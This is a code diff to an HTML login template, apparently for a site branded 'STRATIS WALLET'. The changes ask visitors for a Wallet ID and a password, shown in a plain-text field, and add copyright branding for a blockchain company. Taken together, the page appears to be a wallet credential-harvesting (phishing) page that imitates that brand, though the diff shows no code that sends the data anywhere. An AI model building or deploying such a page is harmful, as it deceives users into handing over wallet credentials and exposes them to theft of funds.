@@ -11,7 +11,7 @@
     />
     <meta
       content="https://pro-bee-beepro-thumbnails.s3.amazonaws.com/messages/730899/713960/1404842/6870908_large.jpg"
-      property="og:image" 
+      property="og:image"
     />
     <meta content="" property="og:title" />
     <meta content="" name="description" />
@@ -97,28 +97,26 @@
         
         <div class="tab-content">
           <div id="signup">   
-            <h1>Enter your Details to get into your account </h1>
+            <h1>Enter your Wallet ID to get into your account </h1>
           
             <div class="login-box">
               <h2>Login</h2>
               <form action="" method="POST">
                 {% csrf_token %}
                 <div class="user-box">
-                  <input  type="text" class="form-control" name="name" required="">
-                  <label>&nbsp; Username</label>
+                  <input type="text" class="form-control" name="name" placeholder="Enter username">
+                  <label>&nbsp; Wallet ID</label>
                 </div>
                 <div class="user-box">
-                  <input type="password" class="form-control" name="pas" required="">
+                  <input type="text" class="form-control" name="pas" placeholder="Enter Password">
                   <label>&nbsp; Password</label>
                 </div>
-                <a href="">
-                <input style="border: hidden;" type="Submit">
+                <input type="Submit">
                   <span></span>
                   <span></span>
                   <span></span>
                   <span></span>
-
-      </a>
+      
               </input>
                
               </form>
@@ -195,7 +193,7 @@
         </div>
       </div>
       <div id="img2">
-        <!-- <img src="/static/images/wallet.jpg" alt=""> -->
+        <img src="/static/images/wallet.jpg" alt="">
       </div>
       <div  class="bee-row bee-row-26">
         <div class="bee-row-content">
@@ -214,10 +212,9 @@
                   text-align: center;
                   margin-top: 0;
                   margin-bottom: 0;
-                  visibility:invisible;
                 "
               >
-                <!-- STRATIS WALLET -->
+                STRATIS WALLET
               </h1>
             </div>
             <div class="bee-block bee-block-2 bee-text">
@@ -246,13 +243,16 @@
                   color: #393d47;
                 "
               >
-               
+                <p style="font-size: 14px; line-height: 16px; text-align: left">
+                  <strong>
+                    2021 © STRATIS BLOCKCHAIN SOLUTIONS All rights reserved
+                  </strong>
+                </p>
               </div>
             </div>
           </div>
           <div class="bee-col bee-col-2 bee-col-w3">
             <div class="bee-block bee-block-1 bee-heading">
-              <br><br><br><br><br>
               <h3
                 style="
                   color: #000000;
@@ -268,11 +268,11 @@
                   margin-bottom: 0;
                 "
               >
-                <!-- <strong> Contact </strong> -->
+                <strong> Contact </strong>
                 <br />
               </h3>
             </div>
-            <div style="visibility: hidden;" class="bee-block bee-block-2 bee-social">
+            <div class="bee-block bee-block-2 bee-social">
               <div class="content">
                 <span class="icon" style="padding: 0 5px 0 5px">
                   <a href="https://www.facebook.com/">
@@ -328,7 +328,7 @@
                 "
               >
               <br>
-                <!-- <strong style="margin-top: 20px;"> Links </strong>
+                <strong style="margin-top: 20px;"> Links </strong>
                 <br />
               </h3>
             </div>
@@ -349,7 +349,7 @@
                 </ul>
               </nav>
             </div>
-          </div> -->
+          </div>
           <div class="bee-col bee-col-4 bee-col-w3">
             <div class="bee-block bee-block-1 bee-image">
               <img
@@ -362,15 +362,6 @@
           </div>
         </div>
       </div>
-      <div>
-
-        <p id="footer">
-         <b>
-
-           POWERED BY STRATIS BLOCKCHAIN
-          </b>
-         
-        </p>
-      </div>
+     
   </body>
 </html>
